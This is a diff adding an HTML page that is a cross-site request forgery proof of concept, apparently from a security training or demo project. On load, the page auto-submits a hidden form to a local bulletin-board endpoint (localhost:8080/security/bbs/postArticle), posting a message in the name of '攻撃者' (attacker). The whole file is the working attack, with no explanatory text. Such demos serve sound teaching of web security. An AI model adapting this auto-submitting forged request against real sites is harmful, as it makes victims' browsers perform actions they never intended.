@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Insert title here</title>
+</head>
+<body onload="document.attackform.submit();">
+	<form name="attackform" action="http://localhost:8080/security/bbs/postArticle" method="post">
+		<input type="hidden" name="name" value="攻撃者">
+		<input type="hidden" name="body" value="攻撃者の書き込み">
+	</form>
+</body>
+</html>
